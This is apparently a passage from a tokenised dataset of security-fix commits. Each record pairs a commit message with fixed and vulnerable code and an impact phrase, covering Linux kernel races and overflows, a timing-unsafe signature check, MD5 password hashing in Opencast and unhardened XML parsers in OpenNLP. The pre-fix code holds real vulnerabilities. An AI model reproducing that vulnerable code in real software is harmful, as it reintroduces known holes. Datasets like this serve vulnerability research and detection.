"service", "(prevention", "of", "file", "creation", "and", "removal", ")"]}
{"contents": ["mm:", "Hold", "a", "file", "reference", "in", "madvise_remove", "Otherwise", "the", "code", "races", "with", "munmap", "(causing", "a", "use-after-free", "of", "the", "vma)", "or", "with", "close", "(causing", "a", "use-after-free", "of", "the", "struct", "file).", "The", "bug", "was", "introduced", "by", "commit", "90ed52ebe481", "(\"[PATCH]", "holepunch:", "fix", "mmap_sem", "i_mutex", "deadlock\")", "Cc:", "Hugh", "Dickins", "<hugh@veritas.com>", "Cc:", "Miklos", "Szeredi", "<mszeredi@suse.cz>", "Cc:", "Badari", "Pulavarty", "<pbadari@us.ibm.com>", "Cc:", "Nick", "Piggin", "<npiggin@suse.de>", "Cc:", "stable@vger.kernel.org", "Signed-off-by:", "Andy", "Lutomirski", "<luto@amacapital.net>", "Signed-off-by:", "Linus", "Torvalds", "<torvalds@linux-foundation.org>"], "code_tokens": ["#", "include", "<", "linux", "/", "file", ".", "h", ">", "struct", "file", "*", "f", ";", "f", "=", "vma", "-", ">", "vm_file", ";", "if", "(", "!", "f", "|", "|", "!", "f", "-", ">", "f_mapping", "|", "|", "!", "f", "-", ">", "f_mapping", "-", ">", "host", ")", "{", "+", "(", "(", "loff_t", ")", "vma", "-", ">", "vm_pgoff", "<", "<", "PAGE_SHIFT", ")", ";", "/", "*", "*", "Filesystem", "'", "s", "fallocate", "may", "need", "to", "take", "i_mutex", ".", "We", "need", "to", "*", "explicitly", "grab", "a", "reference", "because", "the", "vma", "(", "and", "hence", "the", "*", "vma", "'", "s", "reference", "to", "the", "file", ")", "can", "go", "away", "as", "soon", "as", "we", "drop", "*", "mmap_sem", ".", "*", "/", "get_file", "(", "f", ")", ";", "error", "=", "do_fallocate", "(", "f", ",", "fput", "(", "f", ")", ";</s>if", "(", "!", "vma", "-", ">", "vm_file", "|", "|", "!", "vma", "-", ">", "vm_file", "-", ">", "f_mapping", "|", "|", "!", "vma", "-", ">", "vm_file", "-", ">", "f_mapping", "-", ">", "host", ")", "{", "/", "*", "filesystem", "'", "s", "fallocate", "may", "need", "to", "take", "i_mutex", "*", "/", "error", "=", "do_fallocate", "(", "vma", "-", ">", "vm_file", ","], "docstring_tokens": ["cause", "a", "denial", "of", "service", "(use-after-free", "and", "system", "crash", ")"]}
{"contents": ["Use", "constant-time", "string", "comparison", "for", "sigs", "Fixed", "#12"], "code_tokens": ["java", ".", "security", ".", "MessageDigest", ".", "isEqual", "(", "providedSignature", ".", "getBytes", "(", "),", "signature", ".", "getBytes", "(", "))</s>providedSignature", ".", "contentEquals", "(", "signature", ")"], "docstring_tokens": ["guess", "the", "private", "key"]}
{"contents": ["powerpc/tm:", "Block", "signal", "return", "setting", "invalid", "MSR", "state", "Currently", "we", "allow", "both", "the", "MSR", "T", "and", "S", "bits", "to", "be", "set", "by", "userspace", "on", "a", "signal", "return.", "Unfortunately", "this", "is", "a", "reserved", "configuration", "and", "will", "cause", "a", "TM", "Bad", "Thing", "exception", "if", "attempted", "(via", "rfid).", "This", "patch", "checks", "for", "this", "case", "in", "both", "the", "32", "and", "64", "bit", "signals", "code.", "If", "both", "T", "and", "S", "are", "set,", "we", "mark", "the", "context", "as", "invalid.", "Found", "using", "a", "syscall", "fuzzer.", "Fixes:", "2b0a576d15e0", "(\"powerpc:", "Add", "new", "transactional", "memory", "state", "to", "the", "signal", "context\")", "Cc:", "stable@vger.kernel.org", "#", "v3.9+", "Signed-off-by:", "Michael", "Neuling", "<mikey@neuling.org>", "Signed-off-by:", "Michael", "Ellerman", "<mpe@ellerman.id.au>"], "code_tokens": ["#", "define", "MSR_TM_RESV", "(", "x", ")", "(", "((", "x", ")", "&", "MSR_TS_MASK", ")", "=", "=", "MSR_TS_MASK", ")", "/", "*", "Reserved", "*", "/", "/", "*", "Get", "the", "top", "half", "of", "the", "MSR", "from", "the", "user", "context", "*", "/", "if", "(", "__get_user", "(", "msr_hi", ",", "&", "tm_sr", "-", ">", "mc_gregs", "[", "PT_MSR", "]", "))", "return", "1", ";", "msr_hi", "<", "<=", "32", ";", "/", "*", "If", "TM", "bits", "are", "set", "to", "the", "reserved", "value", ",", "it", "'", "s", "an", "invalid", "context", "*", "/", "if", "(", "MSR_TM_RESV", "(", "msr_hi", ")", ")", "return", "1", ";", "/", "*", "Pull", "in", "the", "MSR", "TM", "bits", "from", "the", "user", "context", "*", "/", "regs", "-", ">", "msr", "=", "(", "regs", "-", ">", "msr", "&", "~", "MSR_TS_MASK", ")", "|", "(", "msr_hi", "&", "MSR_TS_MASK", ")", ";", "/", "*", "Don", "'", "t", "allow", "reserved", "mode", ".", "*", "/", "if", "(", "MSR_TM_RESV", "(", "msr", ")", ")", "return", "-", "EINVAL", ";</s>/", "*", "Get", "the", "top", "half", "of", "the", "MSR", "*", "/", "if", "(", "__get_user", "(", "msr_hi", ",", "&", "tm_sr", "-", ">", "mc_gregs", "[", "PT_MSR", "]", "))", "return", "1", ";", "/", "*", "Pull", "in", "MSR", "TM", "from", "user", "context", "*", "/", "regs", "-", ">", "msr", "=", "(", "regs", "-", ">", "msr", "&", "~", "MSR_TS_MASK", ")", "|", "(", "(", "msr_hi", "<", "<", "32", ")", "&", "MSR_TS_MASK", ")", ";"], "docstring_tokens": ["a", "kernel", "panic"]}
{"contents": ["Bluetooth:", "bnep:", "fix", "buffer", "overflow", "Struct", "ca", "is", "copied", "from", "userspace.", "It", "is", "not", "checked", "whether", "the", "\"device\"", "field", "is", "NULL", "terminated.", "This", "potentially", "leads", "to", "BUG()", "inside", "of", "alloc_netdev_mqs()", "and/or", "information", "leak", "by", "creating", "a", "device", "with", "a", "name", "made", "of", "contents", "of", "kernel", "stack.", "Signed-off-by:", "Vasiliy", "Kulikov", "<segoon@openwall.com>", "Signed-off-by:", "Gustavo", "F.", "Padovan", "<padovan@profusion.mobi>"], "code_tokens": ["ca", ".", "device", "[", "sizeof", "(", "ca", ".", "device", ")", "-", "1", "]", "=", "0", ";</s>"], "docstring_tokens": ["obtain", "potentially", "sensitive", "information", "from", "kernel", "stack", "memory"]}
{"contents": ["Replace", "MD5", "with", "bcrypt", "for", "password", "hashing", "User", "passwords", "are", "stored", "in", "the", "database", "using", "the", "rather", "outdated", "and", "cryptographically", "insecure", "MD5", "hash", "algorithm.", "Furthermore,", "the", "hashes", "are", "salted", "using", "the", "username", "instead", "of", "a", "random", "salt,", "causing", "hashes", "for", "users", "with", "the", "same", "username", "and", "password", "to", "collide", "which", "is", "problematic", "especially", "for", "popular", "users", "like", "the", "default", "admin", "user.", "This", "essentially", "means", "that", "for", "an", "attacker,", "it", "might", "be", "feasible", "to", "reconstruct", "a", "user's", "password", "given", "access", "to", "these", "hashes.", "Note", "that", "attackers", "needing", "access", "to", "the", "hashes", "means", "that", "they", "must", "gain", "access", "to", "the", "database", "in", "which", "these", "are", "stored", "first", "to", "be", "able", "to", "start", "cracking", "the", "passwords.", "Patches", "The", "patch", "makes", "Opencast", "now", "uses", "the", "modern", "and", "much", "stronger", "bcrypt", "password", "hashing", "algorithm", "for", "storing", "passwords.", "Note,", "that", "old", "hashes", "remain", "MD5", "until", "the", "password", "is", "updated.", "For", "a", "list", "of", "users", "whose", "password", "hashes", "are", "stored", "using", "MD5,", "the", "REST", "endpoint", "`/user-utils/users/md5.json`", "is", "added."], "code_tokens": ["<", "bean", "id", "=", "\"", "passwordEncoder", "\"", "class", "=", "\"", "org", ".", "opencastproject", ".", "kernel", ".", "security", ".", "CustomPasswordEncoder", "\"", "/", ">", "<", "sec", ":", "password", "-", "encoder", "ref", "=", "\"", "passwordEncoder", "\"", ">", "<", "!-", "-", "This", "salt", "is", "used", "only", "for", "decoding", "legacy", "MD5", "hased", "passwords", "-", "->", "<", "sec", ":", "salt", "-", "source", "user", "-", "property", "=", "\"", "username", "\"", "/", ">", "<", "/", "sec", ":", "password", "-", "encoder", ">", "@", "NamedQuery", "(", "name", "=", "\"", "User", ".", "findInsecureHash", "\"", ",", "query", "=", "\"", "select", "u", "from", "JpaUser", "u", "where", "length", "(", "u", ".", "password", ")", "=", "32", "and", "u", ".", "organization", ".", "id", "=", ":", "org", "\"", "),", "/", "**", "*", "Licensed", "to", "The", "Apereo", "Foundation", "under", "one", "or", "more", "contributor", "license", "*", "agreements", ".", "See", "the", "NOTICE", "file", "distributed", "with", "this", "work", "for", "additional", "*", "information", "regarding", "copyright", "ownership", ".", "*", "*", "*", "The", "Apereo", "Foundation", "licenses", "this", "file", "to", "you", "under", "the", "Educational", "*", "Community", "License", ",", "Version", "2", ".", "0", "(", "the", "\"", "License", "\"", ");", "you", "may", "not", "use", "this", "file", "*", "except", "in", "compliance", "with", "the", "License", ".", "You", "may", "obtain", "a", "copy", "of", "the", "License", "*", "at", ":", "*", "*", "http", ":", "//", "opensource", ".", "org", "/", "licenses", "/", "ecl2", ".", "txt", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "WITHOUT", "*", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "See", "the", "*", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "limitations", "under", "*", "the", "License", ".", "*", "*", "/", "package", "org", ".", "opencastproject", ".", "kernel", ".", "security", ";", "import", "org", ".", "apache", ".", "commons", ".", "codec", ".", "digest", ".", "DigestUtils", ";", "import", "org", ".", "slf4j", ".", "Logger", ";", "import", "org", ".", "slf4j", ".", "LoggerFactory", ";", "import", "org", ".", "springframework", ".", "security", ".", "authentication", ".", "encoding", ".", "PasswordEncoder", ";", "import", "org", ".", "springframework", ".", "security", ".", "crypto", ".", "bcrypt", ".", "BCrypt", ";", "/", "**", "*", "*", "/", "public", "class", "CustomPasswordEncoder", "implements", "PasswordEncoder", "{", "private", "Logger", "logger", "=", "LoggerFactory", ".", "getLogger", "(", "CustomPasswordEncoder", ".", "class", ")", ";", "/", "**", "*", "Encode", "the", "raw", "password", "for", "storage", "using", "BCrypt", ".", "*", "@", "param", "rawPassword", "raw", "password", "to", "encrypt", "/", "hash", "*", "@", "return", "hashed", "password", "*", "/", "public", "String", "encodePassword", "(", "final", "String", "rawPassword", ")", "{", "return", "encodePassword", "(", "rawPassword", ",", "null", ")", ";", "}", "/", "**", "*", "Encode", "the", "raw", "password", "for", "storage", "using", "BCrypt", ".", "*", "@", "param", "rawPassword", "raw", "password", "to", "encrypt", "/", "hash", "*", "@", "param", "ignored", "This", "parameter", "will", "not", "be", "used", ".", "A", "random", "salt", "is", "generated", "by", "BCrypt", ".", "*", "@", "return", "hashed", "password", "*", "/", "@", "Override", "public", "String", "encodePassword", "(", "final", "String", "rawPassword", ",", "final", "Object", "ignored", ")", "{", "return", "BCrypt", ".", "hashpw", "(", "rawPassword", ",", "BCrypt", ".", "gensalt", "(", "))", ";", "}", "/", "**", "*", "Verify", "the", "encoded", "password", "obtained", "from", "storage", "matches", "the", "submitted", "raw", "*", "password", "after", "it", "too", "is", "encoded", ".", "Returns", "true", "if", "the", "passwords", "match", ",", "false", "if", "*", "they", "do", "not", ".", "The", "stored", "password", "itself", "is", "never", "decoded", ".", "*", "*", "@", "param", "rawPassword", "the", "raw", "password", "to", "encode", "and", "match", "*", "@", "param", "encodedPassword", "the", "encoded", "password", "from", "storage", "to", "compare", "with", "*", "@", "return", "true", "if", "the", "raw", "password", ",", "after", "encoding", ",", "matches", "the", "encoded", "password", "from", "storage", "*", "/", "@", "Override", "public", "boolean", "isPasswordValid", "(", "String", "encodedPassword", ",", "String", "rawPassword", ",", "Object", "salt", ")", "{", "/", "/", "Test", "MD5", "encoded", "hash", "if", "(", "encodedPassword", ".", "length", "(", ")", "=", "=", "32", ")", "{", "final", "String", "hash", "=", "md5Encode", "(", "rawPassword", ",", "salt", ")", ";", "logger", ".", "debug", "(", "\"", "Checking", "md5", "hashed", "password", "'", "{}", "'", "against", "encoded", "password", "'", "{}", "'\"", ",", "hash", ",", "encodedPassword", ")", ";", "return", "hash", ".", "equals", "(", "encodedPassword", ")", ";", "}", "/", "/", "Test", "BCrypt", "encoded", "hash", "logger", ".", "debug", "(", "\"", "Verifying", "BCrypt", "hash", "{", "}\"", ",", "encodedPassword", ")", ";", "return", "BCrypt", ".", "checkpw", "(", "rawPassword", ",", "encodedPassword", ")", ";", "}", "/", "**", "*", "Encode", "a", "clear", "text", "password", "using", "Opencast", "'", "s", "legacy", "MD5", "based", "hashing", "with", "salt", ".", "*", "The", "username", "was", "used", "as", "salt", "for", "this", ".", "*", "*", "@", "param", "clearText", "*", "the", "password", "*", "@", "param", "salt", "*", "the", "salt", "*", "@", "return", "the", "hashed", "password", "*", "@", "throws", "IllegalArgumentException", "*", "if", "clearText", "or", "salt", "are", "null", "*", "/", "public", "static", "String", "md5Encode", "(", "String", "clearText", ",", "Object", "salt", ")", "throws", "IllegalArgumentException", "{", "if", "(", "clearText", "=", "=", "null", "|", "|", "salt", "=", "=", "null", ")", "throw", "new", "IllegalArgumentException", "(", "\"", "clearText", "and", "salt", "must", "not", "be", "null", "\"", ");", "return", "DigestUtils", ".", "md5Hex", "(", "clearText", "+", "\"", "{\"", "+", "salt", ".", "toString", "(", ")", "+", "\"", "}\"", ");", "}", "}", "@", "@", "-", "21", ",", "6", "+", "21", ",", "7", "@", "@", "import", "org", ".", "opencastproject", ".", "kernel", ".", "security", ".", "CustomPasswordEncoder", ";", "import", "javax", ".", "persistence", ".", "TypedQuery", ";", "/", "**", "Password", "encoder", "for", "storing", "user", "passwords", "*", "/", "private", "CustomPasswordEncoder", "passwordEncoder", "=", "new", "CustomPasswordEncoder", "(", ");", "/", "**", "*", "List", "all", "users", "with", "insecure", "password", "hashes", "*", "/", "public", "List", "<", "User", ">", "findInsecurePasswordHashes", "(", ")", "{", "final", "String", "orgId", "=", "securityService", ".", "getOrganization", "(", ").", "getId", "(", ");", "EntityManager", "em", "=", "null", ";", "try", "{", "em", "=", "emf", ".", "createEntityManager", "(", ");", "TypedQuery", "<", "User", ">", "q", "=", "em", ".", "createNamedQuery", "(", "\"", "User", ".", "findInsecureHash", "\"", ",", "User", ".", "class", ")", ";", "q", ".", "setParameter", "(", "\"", "org", "\"", ",", "orgId", ")", ";", "return", "q", ".", "getResultList", "(", ");", "}", "finally", "{", "if", "(", "em", "!", "=", "null", ")", "em", ".", "close", "(", ");", "}", "}", "addUser", "(", "user", ",", "false", ")", ";", "}", "/", "**", "*", "Adds", "a", "user", "to", "the", "persistence", "*", "*", "@", "param", "user", "*", "the", "user", "to", "add", "*", "@", "param", "passwordEncoded", "*", "if", "the", "password", "is", "already", "encoded", "or", "should", "be", "encoded", "*", "*", "@", "throws", "org", ".", "opencastproject", ".", "security", ".", "api", ".", "UnauthorizedException", "*", "if", "the", "user", "is", "not", "allowed", "to", "create", "other", "user", "with", "the", "given", "roles", "*", "/", "public", "void", "addUser", "(", "JpaUser", "user", ",", "final", "boolean", "passwordEncoded", ")", "throws", "UnauthorizedException", "{", "String", "encodedPassword", "=", "passwordEncoded", "?", "user", ".", "getPassword", "(", ")", ":", "passwordEncoder", ".", "encodePassword", "(", "user", ".", "getPassword", "(", "))", ";", "return", "updateUser", "(", "user", ",", "false", ")", ";", "}", "/", "**", "*", "Updates", "a", "user", "to", "the", "persistence", "*", "*", "@", "param", "user", "*", "the", "user", "to", "save", "*", "@", "param", "passwordEncoded", "*", "if", "the", "password", "is", "already", "encoded", "or", "should", "be", "encoded", "*", "@", "throws", "NotFoundException", "*", "@", "throws", "org", ".", "opencastproject", ".", "security", ".", "api", ".", "UnauthorizedException", "*", "if", "the", "current", "user", "is", "not", "allowed", "to", "update", "user", "with", "the", "given", "roles", "*", "/", "public", "User", "updateUser", "(", "JpaUser", "user", ",", "final", "boolean", "passwordEncoded", ")", "throws", "NotFoundException", ",", "UnauthorizedException", "{", "if", "(", "passwordEncoded", ")", "{", "encodedPassword", "=", "user", ".", "getPassword", "(", ");", "}", "else", "{", "encodedPassword", "=", "passwordEncoder", ".", "encodePassword", "(", "user", ".", "getPassword", "(", "))", ";", "}", "@", "GET", "@", "Path", "(", "\"", "users", "/", "md5", ".", "json", "\"", ")", "@", "Produces", "(", "MediaType", ".", "APPLICATION_JSON", ")", "@", "RestQuery", "(", "name", "=", "\"", "users", "-", "with", "-", "insecure", "-", "hashing", "\"", ",", "description", "=", "\"", "Returns", "a", "list", "of", "users", "which", "passwords", "are", "stored", "using", "MD5", "hashes", "\"", ",", "returnDescription", "=", "\"", "Returns", "a", "JSON", "representation", "of", "the", "list", "of", "matching", "user", "accounts", "\"", ",", "reponses", "=", "{", "@", "RestResponse", "(", "responseCode", "=", "SC_OK", ",", "description", "=", "\"", "The", "user", "accounts", ".", "\")", "}", ")", "public", "JaxbUserList", "getUserWithInsecurePasswordHashingAsJson", "(", ")", "{", "JaxbUserList", "userList", "=", "new", "JaxbUserList", "(", ");", "for", "(", "User", "user", ":", "jpaUserAndRoleProvider", ".", "findInsecurePasswordHashes", "(", "))", "{", "userList", ".", "add", "(", "user", ")", ";", "}", "return", "userList", ";", "}", "import", "org", ".", "opencastproject", ".", "kernel", ".", "security", ".", "CustomPasswordEncoder", ";", "private", "CustomPasswordEncoder", "passwordEncoder", "=", "new", "CustomPasswordEncoder", "(", ");", "assertTrue", "(", "passwordEncoder", ".", "isPasswordValid", "(", "loadUser", ".", "getPassword", "(", "),", "user", ".", "getPassword", "(", "),", "null", ")", ");", "assertTrue", "(", "passwordEncoder", ".", "isPasswordValid", "(", "loadUser", ".", "getPassword", "(", "),", "user", ".", "getPassword", "(", "),", "null", ")", ");", "assertTrue", "(", "passwordEncoder", ".", "isPasswordValid", "(", "loadUpdatedUser", ".", "getPassword", "(", "),", "newPassword", ",", "null", ")", ");</s><", "sec", ":", "password", "-", "encoder", "hash", "=", "\"", "md5", "\"", "><", "sec", ":", "salt", "-", "source", "user", "-", "property", "=", "\"", "username", "\"", "/", "><", "/", "sec", ":", "password", "-", "encoder", ">", "/", "**", "*", "Licensed", "to", "The", "Apereo", "Foundation", "under", "one", "or", "more", "contributor", "license", "*", "agreements", ".", "See", "the", "NOTICE", "file", "distributed", "with", "this", "work", "for", "additional", "*", "information", "regarding", "copyright", "ownership", ".", "*", "*", "*", "The", "Apereo", "Foundation", "licenses", "this", "file", "to", "you", "under", "the", "Educational", "*", "Community", "License", ",", "Version", "2", ".", "0", "(", "the", "\"", "License", "\"", ");", "you", "may", "not", "use", "this", "file", "*", "except", "in", "compliance", "with", "the", "License", ".", "You", "may", "obtain", "a", "copy", "of", "the", "License", "*", "at", ":", "*", "*", "http", ":", "//", "opensource", ".", "org", "/", "licenses", "/", "ecl2", ".", "txt", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "WITHOUT", "*", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "See", "the", "*", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "limitations", "under", "*", "the", "License", ".", "*", "*", "/", "package", "org", ".", "opencastproject", ".", "util", ";", "import", "org", ".", "apache", ".", "commons", ".", "codec", ".", "digest", ".", "DigestUtils", ";", "/", "**", "*", "A", "password", "encoder", "that", "md5", "hashes", "a", "password", "with", "a", "salt", ".", "*", "/", "public", "final", "class", "PasswordEncoder", "{", "/", "**", "*", "Private", "constructor", "to", "disallow", "construction", "of", "this", "utility", "class", ".", "*", "/", "private", "PasswordEncoder", "(", ")", "{", "}", "/", "**", "*", "Encode", "a", "clear", "text", "password", ".", "*", "*", "@", "param", "clearText", "*", "the", "password", "*", "@", "param", "salt", "*", "the", "salt", ".", "See", "http", ":", "//", "en", ".", "wikipedia", ".", "org", "/", "wiki", "/", "Salt_", "%", "28cryptography", "%", "29", "*", "@", "return", "the", "encoded", "password", "*", "@", "throws", "IllegalArgumentException", "*", "if", "clearText", "or", "salt", "are", "null", "*", "/", "public", "static", "String", "encode", "(", "String", "clearText", ",", "Object", "salt", ")", "throws", "IllegalArgumentException", "{", "if", "(", "clearText", "=", "=", "null", "|", "|", "salt", "=", "=", "null", ")", "throw", "new", "IllegalArgumentException", "(", "\"", "clearText", "and", "salt", "must", "not", "be", "null", "\"", ");", "return", "DigestUtils", ".", "md5Hex", "(", "clearText", "+", "\"", "{\"", "+", "salt", ".", "toString", "(", ")", "+", "\"", "}\"", ");", "}", "}", "@", "@", "-", "0", ",", "0", "+", "1", ",", "96", "@", "@", "import", "org", ".", "opencastproject", ".", "util", ".", "PasswordEncoder", ";", "String", "encodedPassword", "=", "PasswordEncoder", ".", "encode", "(", "user", ".", "getPassword", "(", "),", "user", ".", "getUsername", "(", "))", ";", "encodedPassword", "=", "PasswordEncoder", ".", "encode", "(", "user", ".", "getPassword", "(", "),", "user", ".", "getUsername", "(", "))", ";", "import", "org", ".", "opencastproject", ".", "util", ".", "PasswordEncoder", ";", "assertEquals", "(", "PasswordEncoder", ".", "encode", "(", "user", ".", "getPassword", "(", "),", "user", ".", "getUsername", "(", "))", ",", "loadUser", ".", "getPassword", "(", "))", ";", "assertEquals", "(", "PasswordEncoder", ".", "encode", "(", "user", ".", "getPassword", "(", "),", "user", ".", "getUsername", "(", "))", ",", "loadUser", ".", "getPassword", "(", "))", ";", "assertEquals", "(", "PasswordEncoder", ".", "encode", "(", "newPassword", ",", "user", ".", "getUsername", "(", "))", ",", "loadUpdatedUser", ".", "getPassword", "(", "))", ";"], "docstring_tokens": ["gain", "access", "to", "the", "database", "in", "which", "these", "are", "stored", "first", "to", "be", "able", "to", "start", "cracking", "the", "passwords", "."]}
{"contents": ["OPENNLP-1124:", "Optimize", "XML", "parser", "configuration"], "code_tokens": ["import", "opennlp", ".", "tools", ".", "util", ".", "XmlUtil", ";", "saxParser", "=", "XmlUtil", ".", "createSaxParser", "(", ");", "import", "opennlp", ".", "tools", ".", "util", ".", "XmlUtil", ";", "DocumentBuilder", "docBuilder", "=", "XmlUtil", ".", "createDocumentBuilder", "(", ");", "import", "opennlp", ".", "tools", ".", "util", ".", "XmlUtil", ";", "SAXParser", "saxParser", "=", "XmlUtil", ".", "createSaxParser", "(", ");", "/", "*", "*", "Licensed", "to", "the", "Apache", "Software", "Foundation", "(", "ASF", ")", "under", "one", "or", "more", "*", "contributor", "license", "agreements", ".", "See", "the", "NOTICE", "file", "distributed", "with", "*", "this", "work", "for", "additional", "information", "regarding", "copyright", "ownership", ".", "*", "The", "ASF", "licenses", "this", "file", "to", "You", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "*", "(", "the", "\"", "License", "\"", ");", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "*", "the", "License", ".", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "opennlp", ".", "tools", ".", "util", ";", "import", "javax", ".", "xml", ".", "XMLConstants", ";", "import", "javax", ".", "xml", ".", "parsers", ".", "DocumentBuilder", ";", "import", "javax", ".", "xml", ".", "parsers", ".", "DocumentBuilderFactory", ";", "import", "javax", ".", "xml", ".", "parsers", ".", "ParserConfigurationException", ";", "import", "javax", ".", "xml", ".", "parsers", ".", "SAXParser", ";", "import", "javax", ".", "xml", ".", "parsers", ".", "SAXParserFactory", ";", "import", "org", ".", "xml", ".", "sax", ".", "SAXException", ";", "public", "class", "XmlUtil", "{", "/", "**", "*", "Create", "a", "new", "DocumentBuilder", "which", "processes", "XML", "securely", ".", "*", "*", "@", "return", "a", "DocumentBuilder", "*", "/", "public", "static", "DocumentBuilder", "createDocumentBuilder", "(", ")", "{", "try", "{", "DocumentBuilderFactory", "documentBuilderFactory", "=", "DocumentBuilderFactory", ".", "newInstance", "(", ");", "documentBuilderFactory", ".", "setFeature", "(", "XMLConstants", ".", "FEATURE_SECURE_PROCESSING", ",", "true", ")", ";", "return", "documentBuilderFactory", ".", "newDocumentBuilder", "(", ");", "}", "catch", "(", "ParserConfigurationException", "e", ")", "{", "throw", "new", "IllegalStateException", "(", "e", ")", ";", "}", "}", "/", "**", "*", "Create", "a", "new", "SAXParser", "which", "processes", "XML", "securely", ".", "*", "*", "@", "return", "a", "SAXParser", "*", "/", "public", "static", "SAXParser", "createSaxParser", "(", ")", "{", "SAXParserFactory", "spf", "=", "SAXParserFactory", ".", "newInstance", "(", ");", "try", "{", "spf", ".", "setFeature", "(", "XMLConstants", ".", "FEATURE_SECURE_PROCESSING", ",", "true", ")", ";", "return", "spf", ".", "newSAXParser", "(", ");", "}", "catch", "(", "ParserConfigurationException", "|", "SAXException", "e", ")", "{", "throw", "new", "IllegalStateException", "(", "e", ")", ";", "}", "}", "}", "@", "@", "-", "28", ",", "8", "+", "28", ",", "6", "@", "@", "import", "opennlp", ".", "tools", ".", "util", ".", "XmlUtil", ";", "DocumentBuilder", "documentBuilder", "=", "XmlUtil", ".", "createDocumentBuilder", "(", ");</s>import", "javax", ".", "xml", ".", "parsers", ".", "ParserConfigurationException", ";", "import", "javax", ".", "xml", ".", "parsers", ".", "SAXParserFactory", ";", "SAXParserFactory", "factory", "=", "SAXParserFactory", ".", "newInstance", "(", ");", "try", "{", "saxParser", "=", "factory", ".", "newSAXParser", "(", ");", "}", "catch", "(", "ParserConfigurationException", "|", "SAXException", "e", ")", "{", "throw", "new", "IllegalStateException", "(", "e", ")", ";", "}", "import", "javax", ".", "xml", ".", "parsers", ".", "DocumentBuilderFactory", ";", "import", "javax", ".", "xml", ".", "parsers", ".", "ParserConfigurationException", ";", "DocumentBuilderFactory", "docBuilderFactory", "=", "DocumentBuilderFactory", ".", "newInstance", "(", ");", "DocumentBuilder", "docBuilder", "=", "docBuilderFactory", ".", "newDocumentBuilder", "(", ");", "}", "catch", "(", "ParserConfigurationException", "e", ")", "{", "throw", "new", "IllegalStateException", "(", "e", ")", ";", "import", "javax", ".", "xml", ".", "parsers", ".", "ParserConfigurationException", ";", "import", "javax", ".", "xml", ".", "parsers", ".", "SAXParserFactory", ";", "SAXParserFactory", "spf", "=", "SAXParserFactory", ".", "newInstance", "(", ");", "SAXParser", "saxParser", "=", "spf", ".", "newSAXParser", "(", ");", "}", "catch", "(", "ParserConfigurationException", "e", ")", "{", "throw", "new", "IllegalStateException", "(", "e", ")", ";", "import", "javax", ".", "xml", ".", "parsers", ".", "DocumentBuilderFactory", ";", "import", "javax", ".", "xml", ".", "parsers", ".", "ParserConfigurationException", ";", "DocumentBuilderFactory", "documentBuilderFacoty", "=", "DocumentBuilderFactory", ".", "newInstance", "(", ");", "DocumentBuilder", "documentBuilder", ";", "try", "{", "documentBuilder", "=", "documentBuilderFacoty", ".", "newDocumentBuilder", "(", ");", "}", "catch", "(", "ParserConfigurationException", "e", ")", "{", "throw", "new", "IllegalStateException", "(", "e", ")", ";", "}"], "docstring_tokens": ["obtain", "sensitive", "information", "or", "cause", "a", "denial", "of", "service"]}
{"contents": ["ksm:", "fix", "NULL", "pointer", "dereference", "in", "scan_get_next_rmap_item()", "Andrea", "Righi", "reported", "a", "case", "where", "an", "exiting", "task", "can", "race", "against", "ksmd::scan_get_next_rmap_item", "(http://lkml.org/lkml/2011/6/1/742)", "easily", "triggering", "a", "NULL", "pointer", "dereference", "in", "ksmd.", "ksm_scan.mm_slot", "==", "&ksm_mm_head", "with", "only", "one", "registered", "mm", "CPU", "1", "(__ksm_exit)", "CPU", "2", "(scan_get_next_rmap_item)", "list_empty()", "is", "false", "lock", "slot", "==", "&ksm_mm_head", "list_del(slot->mm_list)", "(list", "now", "empty)", "unlock", "lock", "slot", "=", "list_entry(slot->mm_list.next)", "(list", "is", "empty,", "so", "slot", "is", "still", "ksm_mm_head)", "unlock", "slot->mm", "==", "NULL", "...", "Oops", "Close", "this", "race", "by", "revalidating", "that", "the", "new", "slot", "is", "not", "simply", "the", "list", "head", "again.", "Andrea's", "test", "case:", "#include", "<stdio.h>", "#include", "<stdlib.h>", "#include", "<unistd.h>", "#include", "<sys/mman.h>", "#define", "BUFSIZE", "getpagesize()", "int", "main(int", "argc,", "char", "**argv)", "{", "void", "*ptr;", "if", "(posix_memalign(&ptr,", "getpagesize(),", "BUFSIZE)", "<", "0)", "{", "perror(\"posix_memalign\");", "exit(1);", "}", "if", "(madvise(ptr,", "BUFSIZE,", "MADV_MERGEABLE)", "<", "0)", "{", "perror(\"madvise\");", "exit(1);", "}", "*(char", "*)NULL", "=", "0;", "return", "0;", "}", "Reported-by:", "Andrea", "Righi", "<andrea@betterlinux.com>", "Tested-by:", "Andrea", "Righi", "<andrea@betterlinux.com>", "Cc:", "Andrea", "Arcangeli", "<aarcange@redhat.com>", "Signed-off-by:", "Hugh", "Dickins", "<hughd@google.com>", "Signed-off-by:", "Chris", "Wright", "<chrisw@sous-sol.org>", "Cc:", "<stable@kernel.org>", "Signed-off-by:", "Andrew", "Morton", "<akpm@linux-foundation.org>", "Signed-off-by:", "Linus", "Torvalds", "<torvalds@linux-foundation.org>"], "code_tokens": ["/", "*", "*", "Although", "we", "tested", "list_empty", "(", ")", "above", ",", "a", 